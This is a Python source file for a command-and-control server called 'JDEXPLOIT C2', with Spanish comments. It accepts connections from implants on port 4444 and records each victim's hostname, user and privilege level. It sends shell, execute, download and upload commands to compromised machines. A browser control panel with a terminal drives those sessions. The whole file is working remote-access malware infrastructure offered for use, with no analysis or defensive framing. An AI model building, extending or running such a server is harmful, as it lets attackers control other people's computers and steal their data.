#!/usr/bin/env python3
# ============================================================================
# JDEXPLOIT C2 - VERSIÓN CORREGIDA (SIN CIFRADO PARA PRUEBAS)
# ============================================================================

import os
import sys
import json
import time
import socket
import struct
import threading
import hashlib
import base64
import datetime
import logging
from http import server
from socketserver import ThreadingMixIn
from urllib.parse import urlparse

# ============================================================================
# CONFIGURACIÓN
# ============================================================================
HOST = '0.0.0.0'
C2_PORT = 4444
WEB_PORT = 8080
LOG_FILE = 'c2_operations.log'

# ============================================================================
# COLORES PARA TERMINAL
# ============================================================================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    END = '\033[0m'

# ============================================================================
# LOGGER
# ============================================================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler()]
)
logger = logging.getLogger('C2')

# ============================================================================
# CLIENTE SIMPLE (SIN CIFRADO PARA QUE FUNCIONE)
# ============================================================================
class SimpleClient:
    def __init__(self, conn, addr):
        self.conn = conn
        self.addr = addr
        self.id = hashlib.md5(f"{addr[0]}:{addr[1]}:{time.time()}".encode()).hexdigest()[:8]
        self.hostname = "Unknown"
        self.username = "Unknown"
        self.os = "Windows"
        self.privilege = "USER"
        self.first_seen = datetime.datetime.now()
        self.last_seen = datetime.datetime.now()
        self.active = True
        
        logger.info(f"{Colors.GREEN}[+] Nuevo cliente: {self.id} desde {addr[0]}{Colors.END}")
    
    def send_raw(self, data):
        try:
            if isinstance(data, str):
                data = data.encode('utf-8')
            self.conn.send(struct.pack('>I', len(data)) + data)
            self.last_seen = datetime.datetime.now()
            return True
        except:
            self.active = False
            return False
    
    def send(self, data):
        return self.send_raw(data)
    
    def recvall(self, n):
        data = bytearray()
        while len(data) < n:
            try:
                packet = self.conn.recv(n - len(data))
                if not packet:
                    return None
                data.extend(packet)
            except:
                return None
        return bytes(data)
    
    def recv_raw(self):
        try:
            raw_len = self.recvall(4)
            if not raw_len:
                return None
            msglen = struct.unpack('>I', raw_len)[0]
            if msglen > 10 * 1024 * 1024:
                return None
            data = self.recvall(msglen)
            self.last_seen = datetime.datetime.now()
            return data
        except:
            self.active = False
            return None
    
    def recv(self):
        data = self.recv_raw()
        if not data:
            return None
        try:
            return data.decode('utf-8', errors='ignore')
        except:
            return str(data)
    
    def to_dict(self):
        return {
            'id': self.id,
            'ip': self.addr[0],
            'hostname': self.hostname,
            'username': self.username,
            'privilege': self.privilege,
            'status': 'online' if self.active else 'offline',
            'first_seen': self.first_seen.strftime('%H:%M:%S')
        }

# ============================================================================
# C2 CORE
# ============================================================================
class C2Core:
    def __init__(self):
        self.clients = {}
        self.running = True
        self.lock = threading.Lock()
        self.start_time = datetime.datetime.now()
        logger.info(f"{Colors.GREEN}[🔥] C2 Core inicializado{Colors.END}")
    
    def start(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((HOST, C2_PORT))
            self.socket.listen(100)
            self.socket.settimeout(1.0)
            logger.info(f"{Colors.GREEN}[🔥] Escuchando en {HOST}:{C2_PORT}{Colors.END}")
            threading.Thread(target=self.accept_clients, daemon=True).start()
        except Exception as e:
            logger.error(f"{Colors.RED}[-] Error: {e}{Colors.END}")
            sys.exit(1)
    
    def accept_clients(self):
        while self.running:
            try:
                conn, addr = self.socket.accept()
                conn.settimeout(10.0)
                
                with self.lock:
                    client = SimpleClient(conn, addr)
                    self.clients[client.id] = client
                    
                    # Enviar INFO automáticamente
                    client.send("INFO")
                    
                    # Intentar recibir respuesta (no bloqueante)
                    try:
                        info = client.recv()
                        if info:
                            try:
                                data = json.loads(info)
                                client.hostname = data.get('hostname', 'Unknown')
                                client.username = data.get('username', 'Unknown')
                                client.privilege = data.get('privilege', 'USER')
                                logger.info(f"{Colors.CYAN}[→] {client.id}: {client.hostname} - {client.username}{Colors.END}")
                            except:
                                logger.info(f"{Colors.CYAN}[→] {client.id}: {info[:50]}{Colors.END}")
                    except:
                        pass
                    
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    logger.error(f"{Colors.RED}[-] Error: {e}{Colors.END}")
    
    def send_command(self, client_id, command):
        with self.lock:
            if client_id not in self.clients:
                return f"[-] Cliente {client_id} no encontrado"
            client = self.clients[client_id]
            if not client.active:
                return f"[-] Cliente {client_id} offline"
        
        try:
            logger.info(f"{Colors.BLUE}[→] {client_id}: {command}{Colors.END}")
            
            if not client.send(command):
                return f"[-] Error enviando comando"
            
            response = client.recv()
            if response is None:
                client.active = False
                return f"[-] Cliente no respondió"
            
            logger.info(f"{Colors.CYAN}[←] {client_id}: {response[:100]}{Colors.END}")
            return response
            
        except Exception as e:
            logger.error(f"{Colors.RED}[-] Error: {e}{Colors.END}")
            return f"[-] Error: {e}"
    
    def stop(self):
        self.running = False
        if hasattr(self, 'socket'):
            self.socket.close()

# ============================================================================
# WEB HANDLER
# ============================================================================
class WebHandler(server.BaseHTTPRequestHandler):
    c2 = None
    
    def do_GET(self):
        path = urlparse(self.path).path
        if path == '/':
            self.send_html()
        elif path == '/api/clients':
            self.send_clients()
        elif path == '/api/stats':
            self.send_stats()
        else:
            self.send_error(404)
    
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        if content_length == 0:
            self.send_error(400)
            return
        
        try:
            post_data = self.rfile.read(content_length).decode('utf-8')
            data = json.loads(post_data)
        except:
            self.send_error(400)
            return
        
        if self.path == '/api/command':
            self.handle_command(data)
        else:
            self.send_error(404)
    
    def handle_command(self, data):
        client_id = data.get('client_id')
        command = data.get('command', '')
        args = data.get('args', '')
        
        if not client_id or not command:
            self.send_json({'error': 'Datos incompletos'})
            return
        
        # Construir comando
        if command == 'shell' and args:
            full_cmd = f"SHELL {args}"
        elif command == 'exec' and args:
            full_cmd = f"EXEC {args}"
        elif command == 'download' and args:
            full_cmd = f"DOWNLOAD {args}"
        elif command == 'upload' and args:
            full_cmd = f"UPLOAD {args}"
        else:
            full_cmd = command
        
        response = self.c2.send_command(client_id, full_cmd)
        self.send_json({'response': response})
    
    def send_json(self, obj):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(obj).encode())
    
    def send_clients(self):
        with self.c2.lock:
            clients_list = [c.to_dict() for c in self.c2.clients.values()]
        self.send_json(clients_list)
    
    def send_stats(self):
        with self.c2.lock:
            total = len(self.c2.clients)
            online = sum(1 for c in self.c2.clients.values() if c.active)
        
        stats = {
            'total': total,
            'online': online,
            'uptime': str(datetime.datetime.now() - self.c2.start_time).split('.')[0]
        }
        self.send_json(stats)
    
    def send_html(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        html = """<!DOCTYPE html>
<html>
<head>
    <title>JDEXPLOIT C2</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        .client { border: 1px solid #f00; margin: 10px; padding: 10px; }
        .online { color: #0f0; }
        .offline { color: #f00; }
        .terminal { background: #111; padding: 10px; height: 300px; overflow-y: scroll; }
        input { background: #000; color: #0f0; border: 1px solid #f00; width: 80%; padding: 5px; }
        button { background: #f00; color: #000; border: none; padding: 5px 10px; cursor: pointer; }
    </style>
</head>
<body>
    <h1>🔴 JDEXPLOIT C2</h1>
    <div id="stats">
        <span>Total: <span id="total">0</span></span>
        <span>Online: <span id="online">0</span></span>
        <span>Uptime: <span id="uptime">00:00:00</span></span>
    </div>
    <div id="clients"></div>
    <div class="terminal" id="terminal"></div>
    <input type="text" id="cmd" placeholder="Comando (ej: shell whoami)" disabled>
    <button onclick="sendCmd()" id="send" disabled>Ejecutar</button>

    <script>
        let currentClient = null;
        let clients = {};
        
        setInterval(loadClients, 2000);
        
        function loadClients() {
            fetch('/api/clients')
                .then(r => r.json())
                .then(data => {
                    clients = {};
                    data.forEach(c => clients[c.id] = c);
                    renderClients(data);
                    updateStats();
                });
        }
        
        function renderClients(list) {
            let html = '';
            list.forEach(c => {
                html += `<div class="client ${c.status}" onclick="selectClient('${c.id}')">
                    <strong>${c.id}</strong> | ${c.hostname} | ${c.username} | ${c.privilege} | ${c.status}
                </div>`;
            });
            document.getElementById('clients').innerHTML = html;
        }
        
        function selectClient(id) {
            currentClient = id;
            document.getElementById('cmd').disabled = false;
            document.getElementById('send').disabled = false;
            addToTerminal(`[+] Conectado a ${clients[id].hostname}`);
        }
        
        function sendCmd() {
            let cmd = document.getElementById('cmd').value;
            if (!cmd || !currentClient) return;
            
            addToTerminal(`> ${cmd}`);
            document.getElementById('cmd').value = '';
            
            let parts = cmd.split(' ');
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    client_id: currentClient,
                    command: parts[0],
                    args: parts.slice(1).join(' ')
                })
            })
            .then(r => r.json())
            .then(data => addToTerminal(data.response));
        }
        
        function addToTerminal(text) {
            let t = document.getElementById('terminal');
            t.innerHTML += `<div>${text}</div>`;
            t.scrollTop = t.scrollHeight;
        }
        
        function updateStats() {
            let total = Object.keys(clients).length;
            let online = Object.values(clients).filter(c => c.status == 'online').length;
            document.getElementById('total').innerText = total;
            document.getElementById('online').innerText = online;
        }
        
        document.getElementById('cmd').addEventListener('keypress', function(e) {
            if (e.key == 'Enter') sendCmd();
        });
        
        loadClients();
    </script>
</body>
</html>"""
        self.wfile.write(html.encode())
    
    def log_message(self, format, *args):
        pass

# ============================================================================
# MAIN
# ============================================================================
def main():
    print(f"""
{Colors.RED}
     ██╗██████╗ ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
     ██║██╔══██╗██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
     ██║██║  ██║█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   
██   ██║██║  ██║██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   
╚█████╔╝██████╔╝███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
 ╚════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
{Colors.END}
{Colors.GREEN}[🔥] JDEXPLOIT C2 - MODO COMPATIBLE{Colors.END}
{Colors.YELLOW}[!] Cifrado DESACTIVADO para compatibilidad{Colors.END}
    """)
    
    c2 = C2Core()
    c2.start()
    
    # Web server
    WebHandler.c2 = c2
    web_server = ThreadedHTTPServer((HOST, WEB_PORT), WebHandler)
    print(f"{Colors.CYAN}[*] Web UI: http://{HOST}:{WEB_PORT}{Colors.END}")
    print(f"{Colors.CYAN}[*] C2 TCP: {HOST}:{C2_PORT}{Colors.END}")
    
    try:
        web_server.serve_forever()
    except KeyboardInterrupt:
        c2.stop()
        web_server.shutdown()

class ThreadedHTTPServer(ThreadingMixIn, server.HTTPServer):
    daemon_threads = True

if __name__ == '__main__':
    main()
